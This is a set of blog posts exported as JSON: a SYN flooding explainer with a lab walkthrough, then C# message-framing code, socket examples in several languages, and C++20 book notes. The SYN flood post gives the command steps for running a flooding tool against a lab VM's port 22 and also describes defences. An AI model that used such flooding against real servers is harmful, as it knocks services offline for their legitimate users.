[{"title":"[Code] SYN Flooding — From Principle to Practice","url":"/2026/01/01/2026-1-1-SynFlooding/","content":"IntroductionThis article introduces one of the most common stress-testing methods——SYN flooding——from its underlying principles to practical implementation. A hands-on flooding experiment is also included.\n\nDisclamerThe scripts provided in this article are for educational purposes and authorized stress testing only. Do NOT use them for illegal activities.Anyone who abuses this knoeledge mut take full responsibility for their actions.\n\n\n\n\nWhat Is SYNBefore understanding what SYN is, you should first understand how TCP handshaking works.\n\n    \n        Source: https://afteracademy.com/blog/what-is-a-tcp-3-way-handshake-process/\n    \n\n\nTCP is a reliable, connection-oriented protocol. Its connection establishment process is called the three-way handshake.\n\nThe client sends a SYN (Synchronize) packet to the server.\n\nThe server replies with a SYN+ACK (Synchronize + Acknowledgement) packet.\n\nAfter receiving the SYN+ACK, the client responds with an ACK packet.\n\n\nOnce these steps are completed, a TCP connection between the client and server is successfully established.\n\n\n\n\nHow SYN Flooding Happens.TCP was originally designed to provide reliable communication. Security considerations were not a primary concern at that time.\nSYN flooding exploits the initial stage of the TCP handshake.\nWhen a server receives a SYN packet, the corresponding socket enters the SYN_RECEIVED state. The server then sends a SYN+ACK packet and waits for the final ACK from the client.\n\nIf 1,000 clients attempt to connect, the server must maintain 1,000 half-open connections.\n\nIf millions of clients do the same, the server may be unable to handle such a large number of pending connections.\n\n\nThis situation is commonly referred to as TCP flooding.\nNow, what happens if the server never receives the final ACK packet?\n\n\n\nThe answer is simple:\n\nThe half-open connection will eventually be terminated after a timeout(usually around 1 minute, sometimes longer).\n\nHowever, during this waiting period, the connection still occupies server resources.\nSince each listening port has a limited backlog queue, once all slots are filled, the server can no longer accept new incoming connections—even from legitimate users.\nA simple analogy:\n\nImagine someone occupying a bathroom while playing on their phone.As long as they stay inside, others cannot use it.This is known as resource exhaustion.\n\n\n\n\n\nWhy SYN Flooding is a headacheSYN flooding is particularly problematic because:\n\nHalf-open connections consume resources for a relatively long time.\n\nIP and TCP headers can be easily spoofed.\n\n\nAs a result, an attacker can construct SYN packets with fake source IP addresses, meaning the server will never receive the final ACK packet.\nAdditionally, a SYN flooding attack does not necessarily require a botnet, making it easier to execute compared to other types of DDoS attacks.\n\nLabEnvironment setting up\n\n\n\nDevice\nIP\nDescription\n\n\n\n\nUbuntu 64-bit(VM)\n172.20.10.2\nTarget device.\n\n\nWindows 10\n172.20.10.3\nAttacker device.\n\n\n\n\nTool\n\n\n\nName\nIntroduction\n\n\n\n\nLaserGunDDoS\nFlooding script.\n\n\n\n\nStress testingAttacker:python main.py &quot;Wi-Fi&quot;\n\n\n\n&gt; show\n\n\n\n&gt; set ip 172.20.10.2&gt; show mode&gt; set ports 22\n\nNotice: The target port that you want to attack must be open.\n\n\n\n\n&gt; run\n\n\n\nTarget:$ netstat -ano | grep &quot;SYN_RECV&quot;Notice that the source hosts are all fake.\n\n\n\n\nMitigation &amp; Modern DefensesModern operating systems implement several mechanisms to mitigate SYN flooding attacks.One common approach is SYN cookies, which allow the server to avoid allocating resourcesuntil the final ACK packet is received.Other mitigations include increasing the TCP backlog size, rate limiting incoming SYN packets,and deploying firewall or IDS/IPS rules.\n\nConclusionThis articles describes the underlying priciples of SYN flooding. Furthermore, it demonstrates the implementations, it also provides the modern defnese of this kind of flooding.\n","categories":["Code"],"tags":["Learning","Code","DDoS","DoS"]},{"title":"[Code] Solution of TCP packet sticking/coalescing (sticky packet) - Designing a protocol step by step","url":"/2026/01/01/2026-1-1-RobustiveNetworkProtocol/","content":"IntroductionThis article explains how to solve a common issue in network programming—TCP packet sticking (also known as packet coalescing or sticky packets).In addition, it demonstrates how to design a custom application-layer protocol for socket communication.All examples in this article are implemented in C#.\n\nWhat Is Sticky Packet?If you are not familiar with socket programming, please read the following article first:\n\nSocket Initialization with different languages.\n\nLet us start with a simple receiver implementation:using System;using System.Net.Sockets;using System.Text;class Client&#123;    static void Main()    &#123;        TcpClient client = new TcpClient();        client.Connect(&quot;127.0.0.1&quot;, 8080);        NetworkStream stream = client.GetStream();        string message = &quot;Hello from C# client&quot;;        byte[] data = Encoding.UTF8.GetBytes(message);        stream.Write(data, 0, data.Length);        byte[] buffer = new byte[1024];        int bytesRead = stream.Read(buffer, 0, buffer.Length);        string reply = Encoding.UTF8.GetString(buffer, 0, bytesRead);        Console.WriteLine(&quot;Server reply: &quot; + reply);        client.Close();    &#125;&#125;The root cause of packet sticking lies in the following line:byte[] buffer = new byte[1024];Here, the receive buffer size is fixed at 1024 bytes.However, the size of the data sent by the server (or client—it does not matter) is not guaranteed to be exactly 1024 bytes.\n\nIf the actual message size is 1025 bytes, one byte will be lost.\nIf the actual message size is 512 bytes, it may appear safe at first.\n\n\n\n\nIn practice, the remote host may send messages frequently and continuously.As a result, you may receive a 1024-byte buffer that actually contains two consecutive 512-byte messages.\nIf the receiver cannot distinguish between these two messages, the handler may incorrectly treat them as a single message, which can lead to logic errors or corrupted data.\nThis phenomenon is known as TCP packet sticking.\n\n\n\n\nSolutionTo solve this problem, the sender must explicitly inform the receiver of the message length.\nThe most common and effective approach is to prepend a message header to each payload.In this section, we will design a custom application-layer protocol (OSI Layer 7) to achieve this.\nFundamental DesignWe define the protocol format as follows:| Header | Payload || Field | Description || —- | —- || Header | Constant length. || Payload | Your message. |\nThe header structure is defined as:| Command | Parameter | Length || Field | Size |Description || —- | —- | —- || Command | 1 byte | What the receiver should do. || Parameter | 1 byte | Parameters of the command. || Length | 4 byte | Payload’s length |\nExample command definitions:| Command | Parameter | Meaning || —- | —- | —- || 0 | 0 | Disconnect. || 1 | 0 | Message handler. |\nAt this point, we have successfully defined our protocol.The next step is implementation.\n\nImplementationWe will apply object-oriented programming (OOP) concepts in C#.\n\nNotice: Hungarian notation is used in this implementation.\n\n\nDesigning a class\nclass clsMyProtocol&#123;    public const int MAX_SIZE = 65535;    public const int HEADER_SIZE = 6;    private byte _nCommand = 0;    public byte m_nCommand =&gt; _nCommand;    private byte _nParam = 0;    public byte m_nParam =&gt; _nParam;    private int _nDataLength = 0;    public int m_nDataLength =&gt; _nDataLength;    private byte[] _abMessageData = Array.Empty&lt;byte&gt;();    public byte[] m_abMessageData =&gt; _abMessageData;    private byte[] _abMoreData = Array.Empty&lt;byte&gt;();    public byte[] m_abMoreData =&gt; _abMoreData;    // Constructor for parsing received buffer    public clsMyProtocol(byte[] abBuffer)    &#123;        if (abBuffer == null || abBuffer.Length &lt; HEADER_SIZE)            return;        using (var ms = new MemoryStream(abBuffer))        using (var br = new BinaryReader(ms))        &#123;            _nCommand = br.ReadByte();            _nParam = br.ReadByte();            _nDataLength = br.ReadInt32(); // &lt;-- little-endian by default            if (abBuffer.Length - HEADER_SIZE &gt;= _nDataLength &amp;&amp; _nDataLength &gt; 0)                _abMessageData = br.ReadBytes(_nDataLength);            int remaining = (int)(abBuffer.Length - HEADER_SIZE - _nDataLength);            if (remaining &gt; 0)                _abMoreData = br.ReadBytes(remaining);        &#125;    &#125;    // Constructor for building packets to send    public clsMyProtocol(byte nCmd, byte nParam, byte[] abMsg)    &#123;        _nCommand = nCmd;        _nParam = nParam;        _abMessageData = abMsg;        _nDataLength = _abMessageData.Length;    &#125;    public byte[] fnabGetBytes()    &#123;        try        &#123;            using (var ms = new MemoryStream())            using (var bw = new BinaryWriter(ms))            &#123;                bw.Write(_nCommand);                bw.Write(_nParam);                bw.Write(_nDataLength);                bw.Write(_abMessageData);                return ms.ToArray();            &#125;        &#125;        catch (Exception ex)        &#123;            MessageBox.Show(ex.Message, &quot;fnabGetBytes()&quot;, MessageBoxButtons.OK, MessageBoxIcon.Error);            return Array.Empty&lt;byte&gt;();        &#125;    &#125;    public (byte nCommand, byte nParam, int nLength, byte[] abMsg) fnGetMsg()        =&gt; (_nCommand, _nParam, _nDataLength, _abMessageData);    public static (byte nCommand, byte nParam, int nLength) fnGetHeader(byte[] abBuffer)    &#123;        if (abBuffer == null || abBuffer.Length &lt; HEADER_SIZE)            return (0, 0, 0);        byte nCommand = abBuffer[0];        byte nParam = abBuffer[1];        int nLength = BitConverter.ToInt32(abBuffer, 2);        return (nCommand, nParam, nLength);    &#125;&#125;\n\nReceiver handler:\nbyte[] fnabCombineBytes(byte[] abFirstBytes, int nFirstIndex, int nFirstLength, byte[] abSecondBytes, int nSecondIndex, int nSecondLength)&#123;    byte[] abBytes = new byte[nFirstLength + nSecondLength];    using (MemoryStream ms = new MemoryStream())    &#123;        ms.Write(abFirstBytes, nFirstIndex, nFirstLength);        ms.Write(abSecondBytes, nSecondIndex, nSecondLength);        abBytes = ms.ToArray();    &#125;    return abBytes;&#125;void fnMsgHandler(string szMsg)&#123;    //todo: Message handler.&#125;void fnHandler(Socket skt)&#123;    clsMyProtocol myProto = null;    int nRecvLength = 0;    byte[] abStaticRecvBuffer = new byte[clsMyProtocol.MAX_SIZE];    byte[] abDynamicRecvBuffer = &#123; &#125;;    do    &#123;        abStaticRecvBuffer = new byte[clsMyProtocol.MAX_SIZE];        nRecvLength = skt.Receive(abStaticRecvBuffer);        if (nRecvLength &lt;= 0)            break;        else if (abDynamicRecvBuffer.Length &lt; clsMyProtocol.HEADER_SIZE)            continue;        else        &#123;            var headerInfo = clsMyProtocol.fnGetHeader(abDynamicRecvBuffer);            while (abDynamicRecvBuffer.Length - clsMyProtocol.HEADER_SIZE &gt;= headerInfo.nLength)            &#123;                myProtocol = new clsMyProtocol(abDynamicRecvBuffer);                abDynamicRecvBuffer = myProtocol.m_abMoreData;                headerInfo = clsMyProtocol.fnGetHeader(abDynamicRecvBuffer);                byte[] abBuffer = myProtocol.fnGetMsg().abMsg;                if (myProtocol.m_nCommand == 0)                &#123;                    if (myProtocol.m_nParam == 0)                    &#123;                        skt.Close();                    &#125;                &#125;                else if (myProtocol.m_nCommand == 1)                &#123;                    if (myProtocol.m_nParam == 0)                    &#123;                        string szMsg = Encoding.UTF8.GetString(abBuffer);                        fnMsgHandler(szMsg);                    &#125;                &#125;            &#125;        &#125;    &#125;    while (nRecvLength &gt; 0);&#125;\n\n\nThe sender:\n\nImportant: Both sender and receiver must share the same protocol definition.void fnSendHelloWorld(Socket skt)&#123;    uint nCmd = 1;    uint nParam = 0;    string szMsg = &quot;Hello world!&quot;;    byte[] abMsg = Encoding.UTF8.GetBytes(szMsg);    clsMyProtocol myProtocol = new clsMyProtocol((byte)nCmd, (byte)nParam, abMsg);    skt.Send(myProtocol.fnabGetBytes());&#125;\n\nWith a clearly defined message header and proper buffer management, the original problem—TCP packet sticking—is effectively resolved.\n\n\n\n\nConclusionBy designing a simple yet structured application-layer protocol, you can now establish robust and reliable socket communication, even under high-throughput or bursty network conditions.\n","categories":["Code"],"tags":["Code","C#","Network","Programming","Network Programming"]},{"title":"[Learning] Socket Initialization.","url":"/2026/01/01/2026-1-1-SocketInit/","content":"IntroductionThis article introduces how to initialize socket in different programming languages, such as C++, C# and Python on both Linux and Windows.\n\nWhat is socket?\n\n\n\nA network socket is a software structure within a network node of a computer network that serves as an endpoint for sending and receiving data across the network. The structure and properties of a socket are defined by an application programming interface (API) for the networking architecture. Sockets are created only during the lifetime of a process of an application running in the node.Because of the standardization of the TCP/IP protocols in the development of the Internet, the term network socket is most commonly used in the context of the Internet protocol suite, and is therefore often also referred to as Internet socket. In this context, a socket is externally identified to other hosts by its socket address, which is the triad of transport protocol, IP address, and port number.The term socket is also used for the software endpoint of node-internal inter-process communication (IPC), which often uses the same API as a network socket. —— Wikipedia\n\n\n\n\n…Well, this might look confusing at first.The simplest way to think about it is to imagine an abstract, invisible transmission line between two devices.Device A connects to Device B and sends information.This “invisible transmission line” is what we call a socket.Devices establish stable communication through TCP sockets.\n\nEstablishment of socketC++ (Linux)Functions that you need to know:  \n\nsocket()int socket(int domain, int type, int protocol);\n\n\nDomain: The working domain of your socket:\n\n\n\n\n\nDomain\nMeaning\n\n\n\n\nAF_INET\nIPv4 internetwork(Device to device).\n\n\nAF_INET6\nIPv4 internetwork(Device to device).\n\n\nAF_UNIX\nUnix(Process to process).\n\n\n\n\n\nType: The communication method:\n\n\n\n\n\nType\nMeaning\n\n\n\n\nSOCK_STREAM\nTCP communication\n\n\nSOCK_DGRAM\nUDP datagram.\n\n\n\n\n\nProtocol: Protocol standard, usually set to 0.\n\nsocket() return 0 for successed establishment, otherwise -1.\n\nconnect()int connect(int sockfd, struct sockaddr_in  *server, int addr_len);\n\n\nsockfd: The return value of socket()\nserver: The information about this socket.struct sockaddr_in &#123;    short sin_family; //AF_INET    unsigned short sin_port; //Port number.    struct in_addr sin_addr;    char sin_zero[8]; //Not used, must be zero.&#125;struct in_addr &#123;    unsigned long s_addr; //Load with inet_pton()&#125;\n\n\nThis function is used by the socket client.\n\nbind()\nint bind(int sockfd, struct sockaddr* addr, int addrlen);\n\nlisten()\nint listen(int sockfd, int backlog);\n\n\nThis function is used by the socket server.\nCompleted codeserver.cpp#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;int main() &#123;    int server_fd = socket(AF_INET, SOCK_STREAM, 0);    if (server_fd &lt; 0) &#123;        perror(&quot;socket&quot;);        return 1;    &#125;    sockaddr_in server_addr&#123;&#125;;    server_addr.sin_family = AF_INET;    server_addr.sin_port = htons(8080);          // Port    server_addr.sin_addr.s_addr = INADDR_ANY;    // 0.0.0.0    if (bind(server_fd, (sockaddr*)&amp;server_addr, sizeof(server_addr)) &lt; 0) &#123;        perror(&quot;bind&quot;);        close(server_fd);        return 1;    &#125;    if (listen(server_fd, 5) &lt; 0) &#123;        perror(&quot;listen&quot;);        close(server_fd);        return 1;    &#125;    std::cout &lt;&lt; &quot;Server listening on port 8080...\\n&quot;;    sockaddr_in client_addr&#123;&#125;;    socklen_t client_len = sizeof(client_addr);    int client_fd = accept(server_fd, (sockaddr*)&amp;client_addr, &amp;client_len);    if (client_fd &lt; 0) &#123;        perror(&quot;accept&quot;);        close(server_fd);        return 1;    &#125;    char buffer[1024] = &#123;0&#125;;    read(client_fd, buffer, sizeof(buffer));    std::cout &lt;&lt; &quot;Client says: &quot; &lt;&lt; buffer &lt;&lt; std::endl;    const char* reply = &quot;Hello from server&quot;;    send(client_fd, reply, strlen(reply), 0);    close(client_fd);    close(server_fd);    return 0;&#125;\nclient.cpp#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;unistd.h&gt;#include &lt;arpa/inet.h&gt;int main() &#123;    int sock = socket(AF_INET, SOCK_STREAM, 0);    if (sock &lt; 0) &#123;        perror(&quot;socket&quot;);        return 1;    &#125;    sockaddr_in server_addr&#123;&#125;;    server_addr.sin_family = AF_INET;    server_addr.sin_port = htons(8080);    inet_pton(AF_INET, &quot;127.0.0.1&quot;, &amp;server_addr.sin_addr);    if (connect(sock, (sockaddr*)&amp;server_addr, sizeof(server_addr)) &lt; 0) &#123;        perror(&quot;connect&quot;);        close(sock);        return 1;    &#125;    const char* message = &quot;Hello from client&quot;;    send(sock, message, strlen(message), 0);    char buffer[1024] = &#123;0&#125;;    read(sock, buffer, sizeof(buffer));    std::cout &lt;&lt; &quot;Server reply: &quot; &lt;&lt; buffer &lt;&lt; std::endl;    close(sock);    return 0;&#125;\nCompile and execute:$ g++ server.cpp -o server$ g++ client.cpp -o client$ ./server$ ./client\nC++ (Windows)Different to Linux platform. We use WSA(Windows Sockets API)/Winsock on Windows platform.\nCompleted codeserver.cpp#include &lt;winsock2.h&gt;#include &lt;ws2tcpip.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)int main() &#123;    WSADATA wsa;    WSAStartup(MAKEWORD(2,2), &amp;wsa);    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, 0);    sockaddr_in serverAddr&#123;&#125;;    serverAddr.sin_family = AF_INET;    serverAddr.sin_port = htons(8080);    serverAddr.sin_addr.s_addr = INADDR_ANY;    bind(serverSocket, (sockaddr*)&amp;serverAddr, sizeof(serverAddr));    listen(serverSocket, 5);    std::cout &lt;&lt; &quot;Server listening on port 8080...\\n&quot;;    SOCKET clientSocket = accept(serverSocket, NULL, NULL);    char buffer[1024] = &#123;&#125;;    recv(clientSocket, buffer, sizeof(buffer), 0);    std::cout &lt;&lt; &quot;Client: &quot; &lt;&lt; buffer &lt;&lt; std::endl;    const char* msg = &quot;Hello from Windows server&quot;;    send(clientSocket, msg, strlen(msg), 0);    closesocket(clientSocket);    closesocket(serverSocket);    WSACleanup();    return 0;&#125;client.cpp#include &lt;winsock2.h&gt;#include &lt;ws2tcpip.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;ws2_32.lib&quot;)int main() &#123;    WSADATA wsa;    WSAStartup(MAKEWORD(2,2), &amp;wsa);    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);    sockaddr_in serverAddr&#123;&#125;;    serverAddr.sin_family = AF_INET;    serverAddr.sin_port = htons(8080);    inet_pton(AF_INET, &quot;127.0.0.1&quot;, &amp;serverAddr.sin_addr);    connect(sock, (sockaddr*)&amp;serverAddr, sizeof(serverAddr));    const char* msg = &quot;Hello from Windows client&quot;;    send(sock, msg, strlen(msg), 0);    char buffer[1024] = &#123;&#125;;    recv(sock, buffer, sizeof(buffer), 0);    std::cout &lt;&lt; &quot;Server: &quot; &lt;&lt; buffer &lt;&lt; std::endl;    closesocket(sock);    WSACleanup();    return 0;&#125;\nCserver.csusing System;using System.Net;using System.Net.Sockets;using System.Text;class Server&#123;    static void Main()    &#123;        TcpListener listener = new TcpListener(IPAddress.Any, 8080);        listener.Start();        Console.WriteLine(&quot;Server listening on port 8080...&quot;);        TcpClient client = listener.AcceptTcpClient();        Console.WriteLine(&quot;Client connected&quot;);        NetworkStream stream = client.GetStream();        byte[] buffer = new byte[1024];        int bytesRead = stream.Read(buffer, 0, buffer.Length);        string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);        Console.WriteLine(&quot;Client says: &quot; + message);        string reply = &quot;Hello from C# server&quot;;        byte[] data = Encoding.UTF8.GetBytes(reply);        stream.Write(data, 0, data.Length);        client.Close();        listener.Stop();    &#125;&#125;client.csusing System;using System.Net.Sockets;using System.Text;class Client&#123;    static void Main()    &#123;        TcpClient client = new TcpClient();        client.Connect(&quot;127.0.0.1&quot;, 8080);        NetworkStream stream = client.GetStream();        string message = &quot;Hello from C# client&quot;;        byte[] data = Encoding.UTF8.GetBytes(message);        stream.Write(data, 0, data.Length);        byte[] buffer = new byte[1024];        int bytesRead = stream.Read(buffer, 0, buffer.Length);        string reply = Encoding.UTF8.GetString(buffer, 0, bytesRead);        Console.WriteLine(&quot;Server reply: &quot; + reply);        client.Close();    &#125;&#125;\nPythonserver.pyimport socketserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)server_socket.bind((&quot;0.0.0.0&quot;, 8080))server_socket.listen(5)print(&quot;Server listening on port 8080...&quot;)client_socket, client_addr = server_socket.accept()print(&quot;Client connected:&quot;, client_addr)data = client_socket.recv(1024)print(&quot;Client says:&quot;, data.decode())client_socket.send(b&quot;Hello from Python server&quot;)client_socket.close()server_socket.close()client.pyimport socketclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)client_socket.connect((&quot;127.0.0.1&quot;, 8080))client_socket.send(b&quot;Hello from Python client&quot;)data = client_socket.recv(1024)print(&quot;Server reply:&quot;, data.decode())client_socket.close()\n","categories":["Code"],"tags":["Code","C#","Network","Development","Socket","C++","Python"]},{"title":"[Book] C++ 20 for Programmers - An Objects-Natural Appraoch","url":"/2026/01/02/2026-1-2-NoteCpp20forProgrammers/","content":"El libro\n\n\nIntroductionThis article is used to keep notes and summaries of the book “C++ 20 for Programmers - An Objects-Natural Appraoch”.The content will be continuously updated as I read through the book.\nReflections\nIt definitely strengthened my knowledge of modern C++(C++20).\nThere are some typos in the book.\nChapters 15–17 feel somewhat abstract and require more effort to fully grasp.\n\n\n\n\nChapter.88.7 - Find SubString in a Stringstd::string s = &quot;Hello world&quot;;s.find(&quot;l&quot;); //Start from the beginning.s.rfind(&quot;l&quot;); //Start from the ending.s.find_first_of(&quot;l&quot;);s.find_last_of(&quot;l&quot;);s.find_first_not_of(&quot;l&quot;);s.erase(5); //Erase substring, start from index = 5;\n8.10 - Type conversion\n\n\n\nTo Integer\nReturn Type\n\n\n\n\nstoi\nint\n\n\nstol\nlong\n\n\nstoul\nunsigned long\n\n\nstoll\nlong long\n\n\nstoull\nunsigned long long\n\n\n\n\n\n\n\n\nTo Float\nReturn Type\n\n\n\n\nstof\nfloat\n\n\nstod\ndouble\n\n\nstold\nlong double\n\n\n\n\n8.13 - ofstream#include &lt;cstdlib&gt;#include &lt;fmt/format.h&gt;#include &lt;fstream&gt;#include &lt;iostream&gt;#include &lt;string&gt;int main(int argc, char *argv[]) &#123;    if (std::ofstream output&#123;&quot;clients.txt&quot;, std::ios::out&#125;) &#123;        std::cout &lt;&lt; &quot;Enter the account, name, and balance.\\n&quot;        &lt;&lt; &quot;Enter the end-of-file to end input.\\n? &quot;;        int account;        std::string name;        double balance;        while (std::cin &gt;&gt; account &gt;&gt; name &gt;&gt; balance) &#123;            output &lt;&lt; fmt::format(&quot;&#123;&#125; &#123;&#125; &#123;&#125;\\n&quot;, account, name, balance);            std::cout &lt;&lt; &quot;? &quot;;        &#125;    &#125;    else    &#123;        std::cerr &lt;&lt; &quot;File could not be opened\\n&quot;;        std::exit(EXIT_FAILURE);    &#125;&#125;\n\n\n\n\nMode\nDescription\n\n\n\n\nios::app\nAppending text to the end of the file.\n\n\nios::ate\nOpen a file for output(ofstrema), and seek to the end of the file.\n\n\nios::in\nOpen a file for input.\n\n\nios::out\nOpen a file for output.\n\n\nios::trunc\nOpen a file, and truncate(discard) the content without any warning. This is also the default action of std::out.\n\n\nios::binary\nOpen a binary file for input or output.\n\n\n\n\nclose:output.close();\n8.14 - ifstreamfileObject.seekg(n);fileObject.seekg(n, ios::cur);fileObject.seekg(n, ios::end);fileObject.seekg(0, ios::end);\n8.18 - Raw String Literalstd::string windowsPath&#123;R&quot;(C:\\Windows\\System32\\cmd.exe)&quot;&#125;;\nR&quot;(multiple linesof text)&quot;is same as&quot;multiple lines\\nof text&quot;\nChapter.99.9 - Access the Member of classclsAccount acccount&#123;&#125;; //Declare a class object.clsAccount&amp; ref&#123;account&#125;; //ref refer a class object.clsAccount* ptr&#123;&amp;account&#125;; //ptr point a class object.account.deposit(123.45); //Call by name.ref.deposit(123.45); //Call by reference.ptr-&gt;deposit(123.45); //Call by pointer.\n\nAccording to CppCoreGuidelines instead of using pointe, we should use reference.\n\n9.11\nDRY: Don’t Repeat Yourself.\n\n9.12 - DestructorNon-Static ObjectIf an application call exit or abort, then the destructor will not be called.\nStatic Objectif main() is terminated, or exit() is called, then the destructor of an object will be called. If abort() is called, then the destructor of an object will NOT be called.\n9.18 - Friend Function and Class#include &lt;fmt/format.h&gt;#include &lt;iostream&gt;#include &quot;fmt/format.h&gt;class Count &#123;    friend void modifyX(Count&amp; c, int value); //The original version is &quot;setX&quot;, which is an error.public:    int getX() const &#123;return m_x;&#125;private:    int m_x&#123;0&#125;;&#125;void modifyX(Count&amp; c, int value) &#123;    c.m_x = value;&#125;int main() &#123;    Count counter&#123;&#125;;    std::cout &lt;&lt; fmt::format(&quot;Initial counter.m_x: &#123;&#125;\\n&quot;, counter.getX());    modifyX(counter, 8);    std::cout &lt;&lt; fmt::format(&quot;counter.m_x after modifyX: &#123;&#125;\\n&quot;, counter.getX());&#125;\n9.21 - Aggregate Typestruct Record &#123;    int account;    string first;    string last;    double balance;&#125;\n\nCppCoreGuidlines: Use class rather than struct if any member is non-public\n\nIn C++11, you could not use a list initializer for an aggregate-type objectif any of the type’s non-static data-member declarations contained inclassinitializers. For example, the initialization above would have generateda compilation error if the aggregate type Record were defined with a defaultvalue for balance, as in:struct Record &#123;    int account;    string first;    string last;    double balance&#123;0.0&#125;;&#125;\nC++14 removed this restriction. Also, if you initialize an aggregate-typeobject with fewer initializers than there are data members in the object, as in:Record record&#123;0, &quot;Brian&quot;, &quot;Blue&quot;&#125;;\nIn C++20, we can use designated initializers:Record record&#123;.first&#123;&quot;Sue&quot;&#125;, .last&#123;&quot;Green&quot;&#125;&#125;;The remaining data members get their default initializer values:\n\naccount is set to 0\nbalance is se to its default value in the type definition——in this case, 0.0\n\nChapter.10 - OOP10.2 - Base Class and Derived Class.\n\n\nAdministrator Teacher is-a Administrator, is-a Faculty, is-a Employee, also is-a CommunityMember.\n10.6 - Relationships Among Objects in an Inheritance Hierarchyclass Base &#123;public:    void f() &#123; std::cout &lt;&lt; &quot;Base::f\\n&quot;; &#125;&#125;;class Derived : public Base &#123;public:    void g() &#123; std::cout &lt;&lt; &quot;Derived::g\\n&quot;; &#125;&#125;;Base* p = new Derived();\n\nWhat can we do?p-&gt;f(); //OK!p-&gt;g(); //NO!\n\nDerived class point to base class?class Base &#123;&#125;;class Derived : public Base &#123;&#125;;Base b;Derived* pd = &amp;b;   //NO!\n10.7 - Virtual FunctionVirtual Destructor\nCppCoreGuidlines: A class with any virtual functions should have a destructor that is either public and virtual or else protected and non-virtual.\nA destructor must not fail\n\nvirtual ~Foo() = default;\nfinal:retureType someFunction(parameters) final;someFunction cannot be overriden in any derived class. In a multi-level class hierarchy, this guaratees that the final member-function definition will be used by all subsequent direct and indirect derived classes.class MyClass final &#123;    //body&#125;class DerivedClass : public BaseClass final &#123;    //body&#125;Attempting to override a final member function or inherit from a final base class rsults in a compilation error.  \n\nAdvantage: Once the compiler knows a virtual function cannot be overriden, it can perform various optimizations. For instance, the compiler might be able to determine at compile time the correct function to call. This optimization is called devirtualization.\n\n\n10.8 - Abstract Class and Pure Virtual Clasabstract class\n\nA class that CANNOT be instantiated(You cannot create objects of its type) and is designed to be used as a base class for other classes.\n\nconcrete class\n\nA class that CAN be instantiated.  \n\nA class is made abstract by declaring one or more pure virtual functions, each specified by placing “= 0” in its function prototype, as in:virtual void draw() const = 0; //Pure Virtual Function.\n10.11 - Non-Virtual Interface IdiomAccording to the idiom which was first proposed by Herb Sutter in his paper:  \n\n“Prefer” to make interfaces non-virtual, using Template Method”——an object-oriented design pattern.\n“Prefer to make virtual functions private. A derived class can override its base class’s private virtual functions.\n“Only if derived classes need to invoke the base implementation of a virtual function, make the virtual function protected“.\n“A base-class destructor should be either public and virtual, or protected and non-virtual.\n\n10.12 - Programming to an interface, Not an Implementation\n\nConstructor Injection\nProperty Injection\n\n10.14 - Multiple Inheritance10.15 - protected Class Member10.16 - public, protected and private inheritance10.17 - Wrap-UpChapter.11 - Operator Overloading, Copy/Move Semantics and Smart Pointers11.3 - Operator Overloading Fundamentals\nOperator Overloading Is Not AutomaticWhen operators are overloaded as member functions, they must be non-static. They are called on an object of the class and operate on that object.\nOperators That Cannot Be OverloadedMost of C++’s operators can be overloaded——the following operators cannot:  \n. (dot) member-selection operator\n* pointer-to-member operator\n:: scope-resoltion operator\n?: conditional operator\n\n\nOperators That You Do Not Have to Overload  \n\nThe assignment operator(=) may be used with most classes to perform member-wise assignment of the data members. As you’ll see this can be dangerous for classes that have pointer members. So, you’ll either explicitly overload the assignment operator or explicitly disallow the compiler from defining the default assignment operator. This is also true for the C++11 move assignment operator, which we discuss in Section 11.6.\nThe *address (&amp;) operator returns a pointer to the object.\nThe comma operator evaluates the expression to its left then the expression to its right, and returns the latter expression’s value. Though this operatro can be overloaded, generally, it is not.\n\n\nRules and Restrictions on Operator Overloading  \n\nAn operator’s precedence cannot be changed by overloading.\n**An operator’s grouping cannot be changed by overloading.\n**An operator’s “arity” (the number of operands an operator takes) cannot be changed by overloading.\nOnly existing operators can be overloaded.\nYou cannot overload operators to change how an operator works on only fundamental-type values.\nOperator overloading works only with objects of user-defined types or with a mixture of an object of a user-defined type and an object of a fundamental type.\nRelated operators, like + and +=, generally must be overloaded separately.\nWhen overloading (), [], -&gt; or =, the operator overloading function must be declared as a class member\n\n\n\n\nImportance: You should overload operators for class types to work as closely as possible to how they work with fundamental types. Avoid excessive or inconsistent use of operator overloading, as this can make a program cryptic and difficult to read.\n\n\n11.4 - (Downplaying) Dynamic Memory Management with new and deleteTime* timePtr&#123;new Time&#123;&#125;&#125;;delete timePtr;\n\nImportance: Do not delete memory that was not allocated by new. Doing so results in undefined behavior. After you delete a block of dynamically allocated memory, be sure not to delete the same block again, which typically cause a program to crash. One way to guard against this is to immediately set the pointer to nullptr——deleting such a pointer has not effect.\n\n\nTime* timePtr&#123;new Time&#123;12, 45, 0&#125;&#125;;int* gradesArray&#123;new int[10]&#123;&#125;&#125;;delete[] gradesArray;\n\n11.5 - Modern C++ Dynamic Memory Management—RAII and Smart Pointers\nCppCoreGuidlines: Enforcing the lifetime safety profile eliminates leaks. When combined with resource safety provided by RAII(Resource Acquisition Is Initialization).\n\nC++11 smart pointers use RAII to manage dynamically allocated memory for you. The stanard library header \\ defines three smart pointer types:\n\nunique_ptr\nshared_ptr\nweak_ptr\n\n#include &lt;fmt/format&gt;#include &lt;iostream&gt;#Include &lt;memory&gt;class Integer &#123;public:    Integer(int i) : value&#123;i&#125; &#123;        std::cout &lt;&lt; fmt::format(&quot;Constructor for Integer &#123;&#125;\\n&quot;, value);    &#125;    ~Integer() &#123;        std::cout &lt;&lt; fmt::format(&quot;Destructor for Integer &#123;&#125;\\n&quot;, value);    &#125;private:    int value&#123;0&#125;;&#125;int main() &#123;    std::cout &lt;&lt; &quot;Creating a unique_ptr that points to an Integer\\n&quot;;    auto ptr&#123;std::make_unique&lt;Integer&gt;(7)&#125;;    std::cout &lt;&lt; fmt::format(&quot;Integer value: &#123;&#125;\\n\\nMain ends\\n&quot;, ptr-&gt;getValue());&#125;\nOutput:Creating a unique_ptr that points to an IntegerConstructor for Integer 7Integer value: 7Main endsDestructor for Integer 7\n\n11.6 - MyArray Case Study: 